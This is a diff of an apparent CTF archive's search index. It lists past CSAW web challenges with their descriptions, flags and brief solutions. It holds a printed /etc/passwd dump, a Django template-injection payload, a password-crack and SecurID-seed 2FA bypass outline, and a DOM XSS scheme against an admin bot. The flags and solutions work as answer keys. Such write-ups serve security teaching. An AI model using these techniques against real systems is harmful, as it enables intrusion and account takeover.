Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false  This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.", 
+            "title": "Directory Traversal"
         }, 
         {
             "location": "/challenges/2017/web/orange/", 
@@ -2226,6 +3276,131 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/web/K_stairs-100/", 
+            "text": "K_{Stairs}\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttp://54.152.84.91\n\n\nFlag\n\n\nSolution\n\n\nHitting the site, we are welcomed with the following:\n\n\n\n\nImmediately we register and start looking around.\n\n\n\n\nSo, straight off the bat we notice that we were given 3 tokens for registering to play and there appears to be DLC content available to help us in our conquest.  After a lot of playing around and throwing things (the site was very slow and buggy at times), we noticed that if you register and then just logout and re-register it aggregates your tokens.\n\n\n\n\nDuring our recon we also noticed a hidden compass that said it costs 100 tokens.\n\n\n\n\nWe wasted a lot of time here trying to buy this upgraded compass by changing the \nbid\n parameter to \n4\n, as we thought perhaps it would give us an upper hand while actually playing the game.  No matter what we did we were always greeted with the \nnO-oP\n message.\n\n\n\n\n\n\nBefore you comment on the number of tokens being shown above while trying to purchase a \n100\n compass, these images were taken after the fact.  We had closer to \n200\n tokens available while testing and were never able to purchase this item.  So moving back to collecting tokens.  After we finished registering enough users, we went ahead and purchased the \n10\n token compass, a bunch of food, and headed off on our quest.\n\n\n\n\n\n\nThe compass basically was boolean in nature.  It would only tell you if you were going the right or wrong direction.  We took the approach of heading one direction until it tells us that that is no longer the correct direction and then turn and head the way the compass tells us.  Eventually we wind up finding a staircase.\n\n\n\n\nHeading up the stairs kills us, but only after revealing the flag.", 
+            "title": "K_{Stairs}"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#k_stairs", 
+            "text": "", 
+            "title": "K_{Stairs}"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#description", 
+            "text": "http://54.152.84.91", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_stairs-100/#solution", 
+            "text": "Hitting the site, we are welcomed with the following:   Immediately we register and start looking around.   So, straight off the bat we notice that we were given 3 tokens for registering to play and there appears to be DLC content available to help us in our conquest.  After a lot of playing around and throwing things (the site was very slow and buggy at times), we noticed that if you register and then just logout and re-register it aggregates your tokens.   During our recon we also noticed a hidden compass that said it costs 100 tokens.   We wasted a lot of time here trying to buy this upgraded compass by changing the  bid  parameter to  4 , as we thought perhaps it would give us an upper hand while actually playing the game.  No matter what we did we were always greeted with the  nO-oP  message.    Before you comment on the number of tokens being shown above while trying to purchase a  100  compass, these images were taken after the fact.  We had closer to  200  tokens available while testing and were never able to purchase this item.  So moving back to collecting tokens.  After we finished registering enough users, we went ahead and purchased the  10  token compass, a bunch of food, and headed off on our quest.    The compass basically was boolean in nature.  It would only tell you if you were going the right or wrong direction.  We took the approach of heading one direction until it tells us that that is no longer the correct direction and then turn and head the way the compass tells us.  Eventually we wind up finding a staircase.   Heading up the stairs kills us, but only after revealing the flag.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/", 
+            "text": "K_achieve\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategoru\n\n\nWeb\n\n\nDescription\n\n\nCan you beat it without taking damage?\n\nhttp://54.152.84.91\n\nHINT: State is split up into two parts\nHINT: The map is 256 x 256 and there are 8 types of tiles. Notice anything interesting about the length of the second chunk?\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://itszn.com/blog/?p=20", 
+            "title": "K_{Achieve}"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#k_achieve", 
+            "text": "", 
+            "title": "K_achieve"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#categoru", 
+            "text": "Web", 
+            "title": "Categoru"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#description", 
+            "text": "Can you beat it without taking damage? http://54.152.84.91 \nHINT: State is split up into two parts\nHINT: The map is 256 x 256 and there are 8 types of tiles. Notice anything interesting about the length of the second chunk?", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/K_achieve-200/#solution", 
+            "text": "http://itszn.com/blog/?p=20", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/", 
+            "text": "Big Data\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nSomething, something, data, something, something, big\n\n\nFlag\n\n\nflag{bigdataisaproblemnotasolution}\n\n\nSolution\n\n\nSetup\n\n\nDistribute \npcap.pcapng", 
+            "title": "Big Data"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#big-data", 
+            "text": "", 
+            "title": "Big Data"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#author", 
+            "text": "Cohen", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#points", 
+            "text": "100", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#description", 
+            "text": "Something, something, data, something, something, big", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#flag", 
+            "text": "flag{bigdataisaproblemnotasolution}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/big_data/#setup", 
+            "text": "Distribute  pcap.pcapng", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2017/web/Shia/", 
             "text": "Shia Labeouf-off!\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nDo it\nJust do it\n\n\nDon't let your dreams be dreams\nYesterday you said tomorrow\nSo just do it\nMake your dreams come true\nJust do it\n\n\nSome people dream of success\nWhile you're gonna wake up and work hard at it\nNothing is impossible\n\n\nYou should get to the point\nWhere anyone else would quit\nAnd you're not going to stop there\nNo, what are you waiting for?\n\n\nDo it\nJust do it\nYes you can\nJust do it\nIf you're tired of starting over\nStop giving up\n\n\nPick 1:\n* \nhttp://web.chal.csaw.io:5487\n\n* \nhttp://web.chal.csaw.io:5488\n\n* \nhttp://web.chal.csaw.io:5489\n\n* \nhttp://web.chal.csaw.io:5490\n\n\nFlag\n\n\nflag{wow_much_t3mplate}\n\n\nSolution\n\n\nGo to /polls/3/ to cause a \"Our infrastructure can't support that many Shias!\" exception.\nScroll down to the \"checknum\" function call and view the source code, note the \"getme\" and \"listme\" funcs.\nGo to /ad-lib/ and type \n{% debug %}\n and notice \nmrpoopy\n\nGo back and send \n{{ mrpoopy|listme }}\n notice \n__flag__\n\nGo back and send \n{{ mrpoopy|getme:\n__flag__\n }}\n \nNote: because it is an underscore, you can't just do \n{{ mrpoopy.__flag__ }}\n\n\nSetup\n\n\nWebsite runs on port 8000", 
             "title": "Shia"
@@ -2486,6 +3661,96 @@
             "title": "Notes"
         }, 
         {
+            "location": "/challenges/2015/web/lawn-care-simulator/", 
+            "text": "Lawn Care Simulator\n\n\nAuthor\n\n\nBeastes\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nFlag\n\n\n667e217666098fd0d8055c04c71bebc7\n\n\nSolution\n\n\nsolve.py\n\n\nSetup", 
+            "title": "Lawn Care Simulator"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#lawn-care-simulator", 
+            "text": "", 
+            "title": "Lawn Care Simulator"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#author", 
+            "text": "Beastes", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#points", 
+            "text": "200", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#flag", 
+            "text": "667e217666098fd0d8055c04c71bebc7", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#solution", 
+            "text": "solve.py", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/lawn-care-simulator/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/", 
+            "text": "QuizApp\n\n\nAuthor\n\n\nOberheide\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttps://csaw-2014.appspot.com/\n\n\nFlag\n\n\n96ef46cacf3f832f0e43f7f9e265a3ac3ca0ca2b\n\n\nSolution\n\n\nSo, it's a web app that just gives you a user/pass login prompt.\n\n\nIf you poke around at \nrobots.txt\n or \nsitemap.xml\n, you'll notice a /backup URI:\n\n\n?xml version=\n1.0\n encoding=\nUTF-8\n?\n\n\nurlset xmlns=\nhttp://www.sitemaps.org/schemas/sitemap/0.9\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/auth1\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/backup\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n\n/urlset\n\n\n\n\n\n\nThe /backup URI will dump you a zlib-compressed text of a mysql session:\n\n\ncsaw2014 ~ # mysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 1021899\nServer version: 5.5.32-log Source distribution\n\nCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType \nhelp;\n or \n\\h\n for help. Type \n\\c\n to clear the current input statement.\n\nmysql\n use csaw2014;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql\n show tables;\n+-----------------------+\n| Tables_in_csaw2014    |\n+-----------------------+\n| csaw_auth             |\n| csaw_data             |\n| csaw_flag             |\n+-----------------------+\n3 rows in set (0.00 sec)\n\nmysql\n select * from csaw_auth;\n+----+---------------+---------------------+--------------------------+-------------------+\n| ID | auth_username | auth_password_crypt | auth_securid_seed        | auth_email        |\n+----+---------------+---------------------+--------------------------+-------------------+\n|  1 | jono          | ..0WZygs1WB7.       | dxeTnBVT1aEQWaUlk9zYBg== | jon@oberheide.org |\n+----+---------------+---------------------+--------------------------+-------------------+\n1 row in set (0.00 sec)\n\n\n\n\n\nNote: this is actually fake mysql output, there's no database involved in the challenge. But hopefully people will see the csaw_flag table and get fooled into trying some SQLi. ;-)\n\n\nSo, you can crack that DES-crypted password pretty easily. Once you've done that, you can use that in the original web app login. Then you'll get a two-factor challenge.\n\n\nThe auth_securid_seed value in the DB dump is for a RSA SecurID token so you need to find out how to generate a valid passcode from that seed. Once you've done that, you're past the two-factor auth in the web app.\n\n\nNext, there's a quick quiz Q\nA with the following questions:\n- what's the longest running hacker con in murica?\n- what is one of the l0pht group's lesser-known mottos?\n- what tv-personality-turned-hacker wrote an article on bypassing windows dep?\n- what twitter account run by dino dai zovi is known for providing solid security advice?\n- what's the square root of this apartment?\n\n\nAfter you answer those, you get the flag!\n\n\nSetup", 
+            "title": "App"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#quizapp", 
+            "text": "", 
+            "title": "QuizApp"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#author", 
+            "text": "Oberheide", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#description", 
+            "text": "https://csaw-2014.appspot.com/", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#flag", 
+            "text": "96ef46cacf3f832f0e43f7f9e265a3ac3ca0ca2b", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#solution", 
+            "text": "So, it's a web app that just gives you a user/pass login prompt.  If you poke around at  robots.txt  or  sitemap.xml , you'll notice a /backup URI:  ?xml version= 1.0  encoding= UTF-8 ?  urlset xmlns= http://www.sitemaps.org/schemas/sitemap/0.9 \n   url \n     loc https://csaw-2014.appspot.com/ /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url \n   url \n     loc https://csaw-2014.appspot.com/auth1 /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url \n   url \n     loc https://csaw-2014.appspot.com/backup /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url  /urlset   The /backup URI will dump you a zlib-compressed text of a mysql session:  csaw2014 ~ # mysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 1021899\nServer version: 5.5.32-log Source distribution\n\nCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType  help;  or  \\h  for help. Type  \\c  to clear the current input statement.\n\nmysql  use csaw2014;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql  show tables;\n+-----------------------+\n| Tables_in_csaw2014    |\n+-----------------------+\n| csaw_auth             |\n| csaw_data             |\n| csaw_flag             |\n+-----------------------+\n3 rows in set (0.00 sec)\n\nmysql  select * from csaw_auth;\n+----+---------------+---------------------+--------------------------+-------------------+\n| ID | auth_username | auth_password_crypt | auth_securid_seed        | auth_email        |\n+----+---------------+---------------------+--------------------------+-------------------+\n|  1 | jono          | ..0WZygs1WB7.       | dxeTnBVT1aEQWaUlk9zYBg== | jon@oberheide.org |\n+----+---------------+---------------------+--------------------------+-------------------+\n1 row in set (0.00 sec)  Note: this is actually fake mysql output, there's no database involved in the challenge. But hopefully people will see the csaw_flag table and get fooled into trying some SQLi. ;-)  So, you can crack that DES-crypted password pretty easily. Once you've done that, you can use that in the original web app login. Then you'll get a two-factor challenge.  The auth_securid_seed value in the DB dump is for a RSA SecurID token so you need to find out how to generate a valid passcode from that seed. Once you've done that, you're past the two-factor auth in the web app.  Next, there's a quick quiz Q A with the following questions:\n- what's the longest running hacker con in murica?\n- what is one of the l0pht group's lesser-known mottos?\n- what tv-personality-turned-hacker wrote an article on bypassing windows dep?\n- what twitter account run by dino dai zovi is known for providing solid security advice?\n- what's the square root of this apartment?  After you answer those, you get the flag!", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/app_-_Oberheide/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/challenges/2017/web/csaw-oauth2-chal/", 
             "text": "CSAW OAUTH2\n\n\nAuthor\n\n\nitszn, Ret2 Systems\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWe found this weird site that lets you send short messages of a much better length than 140 280 characters.\n\nhttp://broadcastr.chal.csaw.io:4000\n\nNOTE: The 500 on the /user/history endpoint is irrelevant.\n\n\nFlag\n\n\nflag{m4yb3_w3_n33d_oauth3_n3xt?}\n\n\nSolution\n\n\nsol.py\n\n\nSetup\n\n\n\n\nInstall docker\n\n\nModify \nconfig.sh\n to have the correct urls and settings\n\n\n./create.sh\n to build the docker container\n\n\n./run.sh\n to run the container", 
             "title": "Broadcastr"
@@ -2731,13 +3996,368 @@
             "title": "Solution"
         }, 
         {
+            "location": "/challenges/2015/web/throwback-600/", 
+            "text": "Throwback\n\n\nAuthor\n\n\nPoints\n\n\n600\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nProgramming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year\n:( :( :(\nHINT: If you are smart about it, you do not need to attack the CTF infrastructure.\nHINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://blog.init-labs.org/2015/09/21/csaw-web-600-write-up/\n\n\nhttps://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/throwback\n\n\nhttp://blog.isis.poly.edu/2015/09/21/csaw-ctf-throwback.html", 
+            "title": "Throwback"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#throwback", 
+            "text": "", 
+            "title": "Throwback"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#points", 
+            "text": "600", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#description", 
+            "text": "Programming is hard. CTF software is hard too. We broke our CTF software a few years ago and looks like we did it again this year\n:( :( :(\nHINT: If you are smart about it, you do not need to attack the CTF infrastructure.\nHINT: The source code of our CTF software is on our Github. Also if you tried the challenge with flag{} before, try again.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/throwback-600/#solution", 
+            "text": "http://blog.init-labs.org/2015/09/21/csaw-web-600-write-up/  https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/throwback  http://blog.isis.poly.edu/2015/09/21/csaw-ctf-throwback.html", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/", 
+            "text": "Weeb Date\n\n\nAuthor\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nSince the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called \"weebdate\" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.\nFlag is md5($totpkey.$password)\n\nhttp://54.175.160.194/\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://l.avala.mp/blog/csaw-2015-web-500-writeup/\n\n\nhttp://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/\n\n\nhttp://w00tsec.blogspot.com/2015/09/csaw-2015-write-up-weebdate-web500.html\n\n\nhttp://blog.init-labs.org/2015/09/21/csaw-web-500-write-up/\n\n\nhttps://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/weebdate\n\n\nhttps://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_500_weebdate\n\n\nhttp://blog.isis.poly.edu/2015/10/03/csaw-ctf-weebdate.html", 
+            "title": "Weebdate"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#weeb-date", 
+            "text": "", 
+            "title": "Weeb Date"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#description", 
+            "text": "Since the Ashley Madison hack, a lot of high profile socialites have scrambled to find the hottest new dating sites. Unfortunately for us, that means they're taking more safety measures and only using secure websites. We have some suspicions that Donald Trump is using a new dating site called \"weebdate\" and also selling cocaine to fund his presidential campaign. We need you to get both his password and his 2 factor TOTP key so we can break into his profile and investigate.\nFlag is md5($totpkey.$password) http://54.175.160.194/", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/weebdate-500/#solution", 
+            "text": "http://l.avala.mp/blog/csaw-2015-web-500-writeup/  http://buer.haus/2015/09/20/csaw-2015-web-500-weebdate-writeup/  http://w00tsec.blogspot.com/2015/09/csaw-2015-write-up-weebdate-web500.html  http://blog.init-labs.org/2015/09/21/csaw-web-500-write-up/  https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CSAWCTF/web/weebdate  https://github.com/p4-team/ctf/tree/master/2015-09-16-csaw/web_500_weebdate  http://blog.isis.poly.edu/2015/10/03/csaw-ctf-weebdate.html", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/", 
+            "text": "TBBPE\n\n\nAuthor\n\n\nToews\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nThis is The Best Blogging Platform Ever...\nonly the most exclusive members are ever invited. We need you to break into the site and cast a vote for your team.\n\nhttps://csaw2015-the-blog.herokuapp.com/\n\nHINT: There are two separate bugs required to solve this challenge.\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/mastahyeti/the-blog/blob/master/solution.md\n\n\n\n\nSetup", 
+            "title": "TBBPE"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#tbbpe", 
+            "text": "", 
+            "title": "TBBPE"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#author", 
+            "text": "Toews", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#description", 
+            "text": "This is The Best Blogging Platform Ever...\nonly the most exclusive members are ever invited. We need you to break into the site and cast a vote for your team. https://csaw2015-the-blog.herokuapp.com/ \nHINT: There are two separate bugs required to solve this challenge.", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#solution", 
+            "text": "https://github.com/mastahyeti/the-blog/blob/master/solution.md", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/tbbpe/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/", 
+            "text": "animewall\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWTF dad installed this firewall and now i cant visit my favorite anime websites.\ncan you unload the module for me?\ni believe in you, and more importantly, i believe in the you that believes in you....\nif i cant see animes i guess im gonna just blizz it...\nlain@54.85.189.105\npassword is lain\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
+            "title": "Anime Wall"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#animewall", 
+            "text": "", 
+            "title": "animewall"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#author", 
+            "text": "", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#description", 
+            "text": "WTF dad installed this firewall and now i cant visit my favorite anime websites.\ncan you unload the module for me?\ni believe in you, and more importantly, i believe in the you that believes in you....\nif i cant see animes i guess im gonna just blizz it...\nlain@54.85.189.105\npassword is lain", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/web/animewall/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/", 
+            "text": "Guestbook\n\n\nAuthor\n\n\nToews\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttps://csaw-guestbook.herokuapp.com/\n\n\nFlag\n\n\nflag{octocat-d08b319374e5}\n\n\nSolution\n\n\nThis is a DOM XSS vulnerability in a guestbook application. There is a PhantomJS script that is logged in as the admin user and visits the page once per minute to approve/deny posts. The approve/deny functionality is done over XHR. To build the URL for the XHR request, JavaScript in the page pulls a URL out of an element in the page. The response from the XHR request (success/failure) is then injected into the page.\nThe attacker is able to post messages to the guestbook formatted using markdown. This is then converted to HTML after being run through some HTML sanitization. The HTML sanitization allows the user to set a class attribute on HTML tags. This can be used to trick the approve/deny JavaScript into making the XHR request to an attacker controlled page. The attacker can have this page return arbitrary HTML/JS, leading to XSS.\nWith this XSS, the attacker needs to execute JavaScript to make the admin user post a message with their name in it.\nI don't know how hard of challenges you guys are going for, but I could scale this a bit either way.\nI could also change the application to give a code to the user once they solve the challenge. Would that need to be a unique code per user, or just a single code.\nLet me know if I can clarify anything.\n\n\nSetup", 
+            "title": "Guestbook"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#guestbook", 
+            "text": "", 
+            "title": "Guestbook"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#author", 
+            "text": "Toews", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#points", 
+            "text": "300", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#category", 
+            "text": "Web", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#description", 
+            "text": "https://csaw-guestbook.herokuapp.com/", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#flag", 
+            "text": "flag{octocat-d08b319374e5}", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#solution", 
+            "text": "This is a DOM XSS vulnerability in a guestbook application. There is a PhantomJS script that is logged in as the admin user and visits the page once per minute to approve/deny posts. The approve/deny functionality is done over XHR. To build the URL for the XHR request, JavaScript in the page pulls a URL out of an element in the page. The response from the XHR request (success/failure) is then injected into the page.\nThe attacker is able to post messages to the guestbook formatted using markdown. This is then converted to HTML after being run through some HTML sanitization. The HTML sanitization allows the user to set a class attribute on HTML tags. This can be used to trick the approve/deny JavaScript into making the XHR request to an attacker controlled page. The attacker can have this page return arbitrary HTML/JS, leading to XSS.\nWith this XSS, the attacker needs to execute JavaScript to make the admin user post a message with their name in it.\nI don't know how hard of challenges you guys are going for, but I could scale this a bit either way.\nI could also change the application to give a code to the user once they solve the challenge. Would that need to be a unique code per user, or just a single code.\nLet me know if I can clarify anything.", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2014/web/guestbook_-_Toews/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2014/web/hashes/", 
